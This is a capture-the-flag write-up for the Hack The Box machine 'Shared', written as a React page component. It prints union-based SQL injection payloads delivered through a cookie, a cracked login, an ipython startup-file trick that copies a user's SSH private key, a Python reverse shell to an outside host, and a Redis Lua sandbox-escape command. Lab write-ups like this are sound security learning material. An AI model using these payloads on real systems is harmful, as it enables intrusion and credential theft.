import { Container, Badge, Link, List, ListItem, Code } from '@chakra-ui/react'
import { ExternalLinkIcon } from '@chakra-ui/icons'
import { Title, WorkImage, Meta } from '../../components/post'
import P from '../../components/paragraph'
import Layout from '../../components/layouts/article'

const Post = () => (
  <Layout title="Shared Writeup">
    <Container>
      <Title>
        Shared Machine Writeup <Badge>2022</Badge>
      </Title>
      <P>
      This medium-rated Linux machine includes SQL injection through cookies, wireshark intercepting and much more!
      </P>
      <List ml={4} my={4}>
        <ListItem>
          <Meta>Website</Meta>
          <Link href="https://app.hackthebox.com/machines/Shared">
            https://www.hackthebox.com/machines/Shared <ExternalLinkIcon mx="2px" />
          </Link>
        </ListItem>
        <ListItem>
          <Meta>Platform</Meta>
          <span>Hack The Box</span>
        </ListItem>
        <ListItem>
          <Meta>Skills</Meta>
          <span> SQL injection, Wireshark, Reverse Shells</span>
        </ListItem>
        <ListItem>
          <Meta>Difficulty</Meta>
          <span> 6/10 </span>
        </ListItem>
      </List>
    <P>As always, we first check our target to see if its reachable. ttl=63 confirms us that we are probably looking to a Linux based system.</P>
    <Code>ping -c 1 10.10.11.172</Code>
    <P>A quick nmap reveals that our target has 3 open ports, those being 22, 80 and 443.</P>
    <Code>nmap -p- --min-rate 5000 --open -vvv -n -Pn 10.10.11.172 -oG allports</Code>
    <P>Extracting basic info reveals also that the site has moved permanently. Adding the domain name and ip in /etc/hosts file was for me mandatory in order to navigate to the website.</P>
    <WorkImage src="/images/posts/Shared/recon1.png" alt="recon1"/>
    <P>The web seems to be some kind of online shop. Trying to inject some SQL characters through the &quot;email suscription&quot; field proved to be a fruitless task, so I proceeded to the checkout webpage. We can confirm our conclusions with sqlmap because it will not find any injectable parameter here.</P>
    <Code>sqlmap -u &quot;http://shared.htb&quot; --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3</Code>
    <WorkImage src="/images/posts/Shared/checkout1.png" alt="checkout1"/>
    <P>Intercepting this webpage with burpsuite allow us to play with some extra parameters. Doing so we will finally discover that we can do some SQL injection in the custom-cart cookie parameter. Don&apos;t forget to URL decode it before forwarding the malicious code.</P>
    <WorkImage src="/images/posts/Shared/sql_injection_cookie1.png" alt="sql_injection_cookie1"/>
    <P>Let&apos;s find out what kind of database are we compromising:</P>
    <Code>and 1=2 union select 1, @@version, 3-- -</Code>
    <WorkImage src="/images/posts/Shared/sql_injection_version_hightlighted.png" alt="sql_injection_version_highlighted"/>
    <P>After some guesswork we will find out the table names of the database.</P>
    <Code>and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables-- -</Code>
    <WorkImage src="/images/posts/Shared/sql_injection_table_names.png" alt="sql_injection_table_names"/>
    <P>The table named &apos;user&apos; seems interesting. Let&apos;s find out how many columns does it have.</P>
    <Code>order by 4-- -</Code>
    <WorkImage src="/images/posts/Shared/sql_injection_number_columns2.png" alt="sql_injection_number_columns2.png"/>
    <Code>and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;user&apos;-- -</Code>
    <WorkImage src="/images/posts/Shared/sql_injection_users_columns.png" alt="sql_injection_users_columns"/>
    <P>Now let&apos;s see what user table contains:</P>
    <Code></Code>
    <WorkImage src="/images/posts/Shared/sql_injection_userdump.png" alt="sql_injection_userdump"/>
    <P>As we can see, we obtain a user name and a hashed password. We can reverse the hash thanks to platforms like crackstation:</P>
    <Link href="https://crackstation.net/">https://crackstation.net/ <ExternalLinkIcon mx="2px"/></Link>
    <Code>Userdump: james_mason:Soleil101</Code>
    <P>Thus we connect via ssh using the extracted credentials. A little research shows that another user called Dan is in the system, which has the user flag and some keys, but we cannot access to those yet.</P>
    <WorkImage src="/images/posts/Shared/ssh_conection1.png" alt="ssh_conection1"/>
    <P>Uploading pspy32, a software that allow us to see the processes executing without root permissions, proves to be very necessary when we see an unknown user executing ipython. It could be a breach. Yet another thing that catches my atention is some redis process. We will look into that closer later.</P>
    <Link href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy <ExternalLinkIcon mx="2px"/></Link>
    <WorkImage src="/images/posts/Shared/pspy_ipython.png" alt="pspy_ipython"/>
    <P>Googling for some exploit will provide us with the following one. Aparently you can inject malicious code in some foo.py file and ipython will execute it when you execute the command:</P>
    <Link href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/advisories/GHSA-pq7m-3gw7-gq5x <ExternalLinkIcon mx="2px"/></Link>
    <P>We will use this vulnerability to copy Dan&apos;s rsa keys to a directory we can actually read with the following code:</P>
    <Code>mkdir -m 777 /tmp/profile_default</Code>
    <Code>mkdir -m 777 /tmp/profile_default/startup</Code>
    <Code>echo &quot;import os;os.system(&apos;cat /home/dan_smith/.ssh/id_rsa &gt; /home/dan_smith.key&apos;)&quot; &gt; /tmp/profile_default/startup/foo.py</Code>
    <WorkImage src="/images/posts/Shared/dan_smith_key.png" alt="dan_smith_key"/>
    <P>I also tried to execute an interactive shell as follows but I could not get it to work:</P>
    <Code>echo &quot;export RHOST=&quot;10.10.14.32&quot;;export RPORT=9001;python -c &apos;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&apos;&quot; &gt; /tmp/profile_default/startup/foo.py</Code>
    <P>Now we just need to access to Dan user with our new rsa keys. Once done, we get the user flag.</P>
    <P>Our final task is to get root access. Trying linpeas on the new user provides us with the next info:</P>
    <WorkImage src="/images/posts/Shared/redis_connector_dev.png" alt="redis_connector_dev"/>
    <P>Seems like only us and the root user can read this files. Again a redis file... Some extra info can be extracted from executing the redis-connector-dev file and from the file command:</P>
    <WorkImage src="/images/posts/Shared/redis_connector_dev_execution.png" alt="redis_connector_dev_execution"/>
    <P>It is a ELF 64b LSB executable. Here it doesn&apos;t appear to be doing anything useful. Is trying to connect to something though. Thus we will download it in our computer and execute it, filtering the packages with wireshark so we can dump whatever useful information it is sending. </P>
    <WorkImage src="/images/posts/Shared/wireshark_intercept.png" alt="wireshark_intercept"/>
    <P>It was sending some credentials, so let&apos;s try them. Executing redis-connector-dev and logging in with our credentials works. Now we will google for exploits.</P>
    <P>I have found the following one, which allows us to remotely execute code:</P>
    <Link href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md">https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md <ExternalLinkIcon mx="2px"></ExternalLinkIcon></Link>
    <P>I tried to get a reverse shell so hard but none of them worked :( One example is the following:</P>
    <Code>eval &apos;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;python3 /home/dan_smith/exploit2.py&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&apos; 0</Code>
    <P>If you see what mistake I am commiting, please let me know in any of my social links.</P>
    <P>Nevertheless, finally I captured the flag with the cat command instead of getting a reverse shell.</P>
    <Code>eval &apos;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /root/root.txt&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&apos; 0</Code>
    <WorkImage src="/images/posts/Shared/trying_root_but_get_root_flag_instead.png" alt="rootflag"/>
	  <P>Pwned!</P>

    </Container>
  </Layout>
)

export default Post
